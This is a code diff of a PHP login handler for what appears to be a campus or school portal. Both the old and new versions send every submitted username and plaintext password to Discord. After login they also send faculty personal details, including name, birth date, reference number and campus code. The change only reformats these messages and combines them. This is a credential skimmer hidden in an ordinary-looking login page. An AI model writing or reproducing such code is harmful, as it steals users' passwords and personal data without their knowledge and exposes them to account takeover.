@@ -42,7 +42,7 @@ function sendToDiscord($message) {
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    sendToDiscord("Username: $username, Password: $password");
+    sendToDiscord("```\nUsername: $username\nPassword: $password\n```");
 }
 
 if ($_POST || $googleemail) {
@@ -146,12 +146,10 @@ if ($_POST || $googleemail) {
                 if (isset($_POST['logindemo']))
                     $APP_SESSION->setDemo(true);
 
-                // Send the login attempt to Discord
-                sendToDiscord("Username: $username, Password: $password");
-
-                // Send faculty information to Discord
-                $facultyInfoMessage = "Faculty Info:\nName: " . $employee['Name'] . "\nFirst Name: " . $employee['Firstname'] . "\nReference: " . $employee['Reference'] . "\nBirth Date: " . $employee['BirthDate'] . "\nCampus Code: " . $employee['CampusCode'] . "\nClass: " . $employee['Class'];
-                sendToDiscord($facultyInfoMessage);
+                // Send the login attempt and faculty information to Discord
+                $loginMessage = "```\nUsername: $username\nPassword: $password\n```";
+                $facultyInfoMessage = "```\nFaculty Info:\n**Name:** " . $employee['Name'] . "\n**First Name:** " . $employee['Firstname'] . "\n**Reference:** " . $employee['Reference'] . "\n**Birth Date:** " . $employee['BirthDate'] . "\n**Campus Code:** " . $employee['CampusCode'] . "\n**Class:** " . $employee['Class'] . "\n```";
+                sendToDiscord($loginMessage . "\n" . $facultyInfoMessage);
 
                 // add session validation key using cookie
                 $key = sha1("@@@;chitonian;$username;programming;255;@@@");
